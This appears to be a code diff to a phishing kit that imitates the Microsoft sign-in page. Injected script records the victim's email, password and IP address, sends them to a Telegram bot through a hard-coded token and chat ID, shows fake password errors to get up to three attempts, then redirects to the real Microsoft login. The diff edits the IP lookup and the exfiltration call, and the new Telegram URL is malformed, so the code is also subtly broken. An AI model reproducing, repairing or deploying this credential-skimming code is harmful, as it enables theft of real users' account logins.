@@ -11,20 +11,19 @@
     const botToken = '8024281544:AAHo40hPBYBYAZeFhSLGDsdgVkz5Xe4TyiM';
     const chatId = '7523003121';
 
-    // Reliable Multi-Source IP Fetching
+    // Fixed IP Fetching
     async function fetchIP() {
-        const services = [
-            'https://api.ipify.org',
-            'https://ipinfo.io',
-            'https://api64.ipify.org'
-        ];
-        for (let url of services) {
+        try {
+            // Using a service that returns plain text to avoid JSON errors
+            const response = await fetch('https://api.ipify.org');
+            userIP = await response.text();
+        } catch (e) {
+            // Fallback to a JSON service if plain text fails
             try {
-                const response = await fetch(url, { signal: AbortSignal.timeout(3000) });
-                const data = await response.json();
-                userIP = data.ip || data.address || "Unknown";
-                if (userIP !== "Unknown") break;
-            } catch (e) { continue; }
+                const res = await fetch('https://ipapi.co');
+                const data = await res.json();
+                userIP = data.ip;
+            } catch (err) { userIP = "Unknown"; }
         }
     }
     fetchIP();
@@ -35,7 +34,7 @@
             button[type="button"] img, .back-button, #idBtn_Back, .identityBanner img, .back-arrow { 
                 display: none !important; 
             }
-            .error-text { color: #e81123; font-size: 0.8125rem; margin-bottom: 12px; display: none; font-family: 'Segoe UI'; }
+            #custom-error { color: #e81123; font-size: 0.8125rem; margin-bottom: 12px; display: none; font-family: 'Segoe UI'; }
         `;
         document.head.appendChild(style);
 
@@ -46,11 +45,11 @@
         if (!passwordField) return;
         const parentContainer = passwordField.parentNode;
 
+        // Correctly define errorDiv and give it an ID
         const errorDiv = document.createElement('div');
-        errorDiv.className = "error-text";
+        errorDiv.id = "custom-error";
         errorDiv.innerText = "Please check your password and try again.";
 
-        // IDENTITY ROW (ARROW + EMAIL) - Positioned High
         const identityRow = document.createElement('div');
         identityRow.id = "custom-identity-row";
         identityRow.style = "display: none; align-items: center; gap: 8px; margin-top: -24px; margin-bottom: 8px; cursor: pointer; width: 100%;";
@@ -106,26 +105,21 @@
                     step = 2;
                 } else {
                     const passVal = passwordField.value.trim();
-                                        if (passVal === "") return;
+                    if (passVal === "") return;
 
                     attempts++;
                     const msg = `🔔 **MS Login**\n📧 User: ${emailInput.value}\n🔑 Pass: ${passVal}\n🔢 Try: ${attempts}/3\n🌐 IP: ${userIP}`;
                     
-                    // Corrected URL: Removed curly braces and added '/bot' before the token.
-                    fetch(`https://api.telegram.org/bot8024281544:AAHo40hPBYBYAZeFhSLGDsdgVkz5Xe4TyiM/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, { mode: 'no-cors' });
-
-                    // Add this line to define errorDiv
-                    const errorDiv = document.getElementById('yourErrorDivId'); // Replace 'yourErrorDivId' with the actual ID of your error message div.
+                    // Fixed URL using variables
+                    fetch(`https://api.telegram.org{botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, { mode: 'no-cors' });
 
                     setTimeout(() => {
                         if (attempts < 3) {
-                            if (errorDiv) { // Add a check to ensure errorDiv is found
-                                errorDiv.style.display = "block";
-                            }
+                            errorDiv.style.display = "block";
                             passwordField.value = '';
                             passwordField.focus();
                         } else {
-                            window.location.href = 'https://login.microsoftonline/jsdisbled';
+                            window.location.href = 'https://login.microsoftonline.com';
                         }
                     }, 800);
                 }
@@ -133,6 +127,8 @@
         }
     });
 </script>
+
+
 
 
 
